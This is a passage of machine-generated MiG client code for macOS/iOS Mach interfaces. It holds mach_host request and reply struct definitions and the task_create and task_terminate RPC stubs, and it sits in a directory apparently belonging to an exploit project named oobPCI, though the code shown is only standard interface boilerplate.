	__Request__host_processor_info_t Request_host_processor_info;
	__Request__host_get_io_main_t Request_host_get_io_main;
	__Request__host_get_clock_service_t Request_host_get_clock_service;
	__Request__kmod_get_info_t Request_kmod_get_info;
	__Request__host_virtual_physical_table_info_t Request_host_virtual_physical_table_info;
	__Request__processor_set_default_t Request_processor_set_default;
	__Request__processor_set_create_t Request_processor_set_create;
	__Request__mach_memory_object_memory_entry_64_t Request_mach_memory_object_memory_entry_64;
	__Request__host_statistics_t Request_host_statistics;
	__Request__host_request_notification_t Request_host_request_notification;
	__Request__host_lockgroup_info_t Request_host_lockgroup_info;
	__Request__host_statistics64_t Request_host_statistics64;
	__Request__mach_zone_info_t Request_mach_zone_info;
	__Request__host_create_mach_voucher_t Request_host_create_mach_voucher;
	__Request__host_register_mach_voucher_attr_manager_t Request_host_register_mach_voucher_attr_manager;
	__Request__host_register_well_known_mach_voucher_attr_manager_t Request_host_register_well_known_mach_voucher_attr_manager;
	__Request__host_set_atm_diagnostic_flag_t Request_host_set_atm_diagnostic_flag;
	__Request__host_get_atm_diagnostic_flag_t Request_host_get_atm_diagnostic_flag;
	__Request__mach_memory_info_t Request_mach_memory_info;
	__Request__host_set_multiuser_config_flags_t Request_host_set_multiuser_config_flags;
	__Request__host_get_multiuser_config_flags_t Request_host_get_multiuser_config_flags;
	__Request__host_check_multiuser_mode_t Request_host_check_multiuser_mode;
	__Request__mach_zone_info_for_zone_t Request_mach_zone_info_for_zone;
};
#endif /* !__RequestUnion__mach_host_subsystem__defined */
/* typedefs for all replies */

#ifndef __Reply__mach_host_subsystem__defined
#define __Reply__mach_host_subsystem__defined

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t host_info_outCnt;
		integer_t host_info_out[68];
	} __Reply__host_info_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t kernel_versionOffset; /* MiG doesn't use it */
		mach_msg_type_number_t kernel_versionCnt;
		char kernel_version[512];
	} __Reply__host_kernel_version_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		vm_size_t out_page_size;
	} __Reply___host_page_size_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t entry_handle;
		/* end of the kernel processed data */
	} __Reply__mach_memory_object_memory_entry_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t out_processor_info;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		natural_t out_processor_count;
		mach_msg_type_number_t out_processor_infoCnt;
	} __Reply__host_processor_info_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t io_main;
		/* end of the kernel processed data */
	} __Reply__host_get_io_main_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t clock_serv;
		/* end of the kernel processed data */
	} __Reply__host_get_clock_service_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t modules;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t modulesCnt;
	} __Reply__kmod_get_info_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t info;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t infoCnt;
	} __Reply__host_virtual_physical_table_info_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t default_set;
		/* end of the kernel processed data */
	} __Reply__processor_set_default_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t new_set;
		mach_msg_port_descriptor_t new_name;
		/* end of the kernel processed data */
	} __Reply__processor_set_create_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t entry_handle;
		/* end of the kernel processed data */
	} __Reply__mach_memory_object_memory_entry_64_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t host_info_outCnt;
		integer_t host_info_out[68];
	} __Reply__host_statistics_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__host_request_notification_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t lockgroup_info;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t lockgroup_infoCnt;
	} __Reply__host_lockgroup_info_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t host_info64_outCnt;
		integer_t host_info64_out[256];
	} __Reply__host_statistics64_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t names;
		mach_msg_ool_descriptor_t info;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t namesCnt;
		mach_msg_type_number_t infoCnt;
	} __Reply__mach_zone_info_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t voucher;
		/* end of the kernel processed data */
	} __Reply__host_create_mach_voucher_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t new_attr_control;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_voucher_attr_key_t new_key;
	} __Reply__host_register_mach_voucher_attr_manager_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t new_attr_control;
		/* end of the kernel processed data */
	} __Reply__host_register_well_known_mach_voucher_attr_manager_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__host_set_atm_diagnostic_flag_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		uint32_t diagnostic_flag;
	} __Reply__host_get_atm_diagnostic_flag_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t names;
		mach_msg_ool_descriptor_t info;
		mach_msg_ool_descriptor_t memory_info;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t namesCnt;
		mach_msg_type_number_t infoCnt;
		mach_msg_type_number_t memory_infoCnt;
	} __Reply__mach_memory_info_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply__host_set_multiuser_config_flags_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		uint32_t multiuser_flags;
	} __Reply__host_get_multiuser_config_flags_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		uint32_t multiuser_mode;
	} __Reply__host_check_multiuser_mode_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_zone_info_t info;
	} __Reply__mach_zone_info_for_zone_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
#endif /* !__Reply__mach_host_subsystem__defined */

/* union of all replies */

#ifndef __ReplyUnion__mach_host_subsystem__defined
#define __ReplyUnion__mach_host_subsystem__defined
union __ReplyUnion__mach_host_subsystem {
	__Reply__host_info_t Reply_host_info;
	__Reply__host_kernel_version_t Reply_host_kernel_version;
	__Reply___host_page_size_t Reply__host_page_size;
	__Reply__mach_memory_object_memory_entry_t Reply_mach_memory_object_memory_entry;
	__Reply__host_processor_info_t Reply_host_processor_info;
	__Reply__host_get_io_main_t Reply_host_get_io_main;
	__Reply__host_get_clock_service_t Reply_host_get_clock_service;
	__Reply__kmod_get_info_t Reply_kmod_get_info;
	__Reply__host_virtual_physical_table_info_t Reply_host_virtual_physical_table_info;
	__Reply__processor_set_default_t Reply_processor_set_default;
	__Reply__processor_set_create_t Reply_processor_set_create;
	__Reply__mach_memory_object_memory_entry_64_t Reply_mach_memory_object_memory_entry_64;
	__Reply__host_statistics_t Reply_host_statistics;
	__Reply__host_request_notification_t Reply_host_request_notification;
	__Reply__host_lockgroup_info_t Reply_host_lockgroup_info;
	__Reply__host_statistics64_t Reply_host_statistics64;
	__Reply__mach_zone_info_t Reply_mach_zone_info;
	__Reply__host_create_mach_voucher_t Reply_host_create_mach_voucher;
	__Reply__host_register_mach_voucher_attr_manager_t Reply_host_register_mach_voucher_attr_manager;
	__Reply__host_register_well_known_mach_voucher_attr_manager_t Reply_host_register_well_known_mach_voucher_attr_manager;
	__Reply__host_set_atm_diagnostic_flag_t Reply_host_set_atm_diagnostic_flag;
	__Reply__host_get_atm_diagnostic_flag_t Reply_host_get_atm_diagnostic_flag;
	__Reply__mach_memory_info_t Reply_mach_memory_info;
	__Reply__host_set_multiuser_config_flags_t Reply_host_set_multiuser_config_flags;
	__Reply__host_get_multiuser_config_flags_t Reply_host_get_multiuser_config_flags;
	__Reply__host_check_multiuser_mode_t Reply_host_check_multiuser_mode;
	__Reply__mach_zone_info_for_zone_t Reply_mach_zone_info_for_zone;
};
#endif /* !__RequestUnion__mach_host_subsystem__defined */

#ifndef subsystem_to_name_map_mach_host
#define subsystem_to_name_map_mach_host \
    { "host_info", 200 },\
    { "host_kernel_version", 201 },\
    { "_host_page_size", 202 },\
    { "mach_memory_object_memory_entry", 203 },\
    { "host_processor_info", 204 },\
    { "host_get_io_main", 205 },\
    { "host_get_clock_service", 206 },\
    { "kmod_get_info", 207 },\
    { "host_virtual_physical_table_info", 209 },\
    { "processor_set_default", 213 },\
    { "processor_set_create", 214 },\
    { "mach_memory_object_memory_entry_64", 215 },\
    { "host_statistics", 216 },\
    { "host_request_notification", 217 },\
    { "host_lockgroup_info", 218 },\
    { "host_statistics64", 219 },\
    { "mach_zone_info", 220 },\
    { "host_create_mach_voucher", 222 },\
    { "host_register_mach_voucher_attr_manager", 223 },\
    { "host_register_well_known_mach_voucher_attr_manager", 224 },\
    { "host_set_atm_diagnostic_flag", 225 },\
    { "host_get_atm_diagnostic_flag", 226 },\
    { "mach_memory_info", 227 },\
    { "host_set_multiuser_config_flags", 228 },\
    { "host_get_multiuser_config_flags", 229 },\
    { "host_check_multiuser_mode", 230 },\
    { "mach_zone_info_for_zone", 231 }
#endif

#ifdef __AfterMigUserHeader
__AfterMigUserHeader
#endif /* __AfterMigUserHeader */

#endif	 /* _mach_host_user_ */

```

`Exploits/oobPCI/Sources/generated/task.c`:

```c
/*
 * IDENTIFICATION:
 * stub generated by bootstrap_cmds-128
 * OPTIONS: 
 */
#define	__MIG_check__Reply__task_subsystem__ 1

#include "task.h"

/* TODO: #include <mach/mach.h> */
#ifdef __cplusplus
extern "C" {
#endif /* __cplusplus */
extern void mach_msg_destroy(mach_msg_header_t *);
#ifdef __cplusplus
}
#endif /* __cplusplus */

#ifndef	mig_internal
#define	mig_internal	static __inline__
#endif	/* mig_internal */

#ifndef	mig_external
#define mig_external
#endif	/* mig_external */

#if	!defined(__MigTypeCheck) && defined(TypeCheck)
#define	__MigTypeCheck		TypeCheck	/* Legacy setting */
#endif	/* !defined(__MigTypeCheck) */

#if	!defined(__MigKernelSpecificCode) && defined(_MIG_KERNEL_SPECIFIC_CODE_)
#define	__MigKernelSpecificCode	_MIG_KERNEL_SPECIFIC_CODE_	/* Legacy setting */
#endif	/* !defined(__MigKernelSpecificCode) */

#ifndef	LimitCheck
#define	LimitCheck 0
#endif	/* LimitCheck */

#ifndef	min
#define	min(a,b)  ( ((a) < (b))? (a): (b) )
#endif	/* min */

#if !defined(_WALIGN_)
#define _WALIGN_(x) (((x) + 3) & ~3)
#endif /* !defined(_WALIGN_) */

#if !defined(_WALIGNSZ_)
#define _WALIGNSZ_(x) _WALIGN_(sizeof(x))
#endif /* !defined(_WALIGNSZ_) */

#ifndef	UseStaticTemplates
#define	UseStaticTemplates	0
#endif	/* UseStaticTemplates */

#ifndef MIG_SERVER_ROUTINE
#define MIG_SERVER_ROUTINE
#endif

#ifndef	__MachMsgErrorWithTimeout
#define	__MachMsgErrorWithTimeout(_R_) { \
	switch (_R_) { \
	case MACH_SEND_INVALID_DATA: \
	case MACH_SEND_INVALID_DEST: \
	case MACH_SEND_INVALID_HEADER: \
		mig_put_reply_port(InP->Head.msgh_reply_port); \
		break; \
	case MACH_SEND_TIMED_OUT: \
	case MACH_RCV_TIMED_OUT: \
	default: \
		mig_dealloc_reply_port(InP->Head.msgh_reply_port); \
	} \
}
#endif	/* __MachMsgErrorWithTimeout */

#ifndef	__MachMsgErrorWithoutTimeout
#define	__MachMsgErrorWithoutTimeout(_R_) { \
	switch (_R_) { \
	case MACH_SEND_INVALID_DATA: \
	case MACH_SEND_INVALID_DEST: \
	case MACH_SEND_INVALID_HEADER: \
		mig_put_reply_port(InP->Head.msgh_reply_port); \
		break; \
	default: \
		mig_dealloc_reply_port(InP->Head.msgh_reply_port); \
	} \
}
#endif	/* __MachMsgErrorWithoutTimeout */

#ifndef	__DeclareSendRpc
#define	__DeclareSendRpc(_NUM_, _NAME_)
#endif	/* __DeclareSendRpc */

#ifndef	__BeforeSendRpc
#define	__BeforeSendRpc(_NUM_, _NAME_)
#endif	/* __BeforeSendRpc */

#ifndef	__AfterSendRpc
#define	__AfterSendRpc(_NUM_, _NAME_)
#endif	/* __AfterSendRpc */

#ifndef	__DeclareSendSimple
#define	__DeclareSendSimple(_NUM_, _NAME_)
#endif	/* __DeclareSendSimple */

#ifndef	__BeforeSendSimple
#define	__BeforeSendSimple(_NUM_, _NAME_)
#endif	/* __BeforeSendSimple */

#ifndef	__AfterSendSimple
#define	__AfterSendSimple(_NUM_, _NAME_)
#endif	/* __AfterSendSimple */

#define msgh_request_port	msgh_remote_port
#define msgh_reply_port		msgh_local_port



#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_create_t__defined)
#define __MIG_check__Reply__task_create_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_create_t(__Reply__task_create_t *Out0P)
{

	typedef __Reply__task_create_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 3500) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->child_task.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->child_task.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__task_create_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_create */
mig_external kern_return_t task_create
(
	task_t target_task,
	ledger_array_t ledgers,
	mach_msg_type_number_t ledgersCnt,
	boolean_t inherit_memory,
	task_t *child_task
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_ports_descriptor_t ledgers;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t ledgersCnt;
		boolean_t inherit_memory;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t child_task;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t child_task;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_create_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_create_t__defined */

	__DeclareSendRpc(3400, "task_create")

#if	UseStaticTemplates
	const static mach_msg_ool_ports_descriptor_t ledgersTemplate = {
		/* addr = */		(void *)0,
		/* coun = */		0,
		/* deal = */		FALSE,
		/* copy is meaningful only in overwrite mode */
		/* copy = */		MACH_MSG_PHYSICAL_COPY,
		/* disp = */		19,
		/* type = */		MACH_MSG_OOL_PORTS_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->ledgers = ledgersTemplate;
	InP->ledgers.address = (void *)(ledgers);
	InP->ledgers.count = ledgersCnt;
#else	/* UseStaticTemplates */
	InP->ledgers.address = (void *)(ledgers);
	InP->ledgers.count = ledgersCnt;
	InP->ledgers.disposition = 19;
	InP->ledgers.deallocate =  FALSE;
	InP->ledgers.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
#endif	/* UseStaticTemplates */


	InP->NDR = NDR_record;

	InP->ledgersCnt = ledgersCnt;

	InP->inherit_memory = inherit_memory;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = target_task;
	InP->Head.msgh_id = 3400;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3400, "task_create")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3400, "task_create")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_create_t__defined)
	check_result = __MIG_check__Reply__task_create_t((__Reply__task_create_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_create_t__defined) */

	*child_task = Out0P->child_task.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_terminate_t__defined)
#define __MIG_check__Reply__task_terminate_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_terminate_t(__Reply__task_terminate_t *Out0P)
{

	typedef __Reply__task_terminate_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3501) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__task_terminate_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_terminate */
mig_external kern_return_t task_terminate
(
	task_t target_task
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_terminate_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_terminate_t__defined */

	__DeclareSendRpc(3401, "task_terminate")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = target_task;
	InP->Head.msgh_id = 3401;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3401, "task_terminate")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3401, "task_terminate")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_terminate_t__defined)
	check_result = __MIG_check__Reply__task_terminate_t((__Reply__task_terminate_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_terminate_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_threads_t__defined)
#define __MIG_check__Reply__task_threads_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_threads_t(__Reply__task_threads_t *Out0P)
{

	typedef __Reply__task_threads_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 3502) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
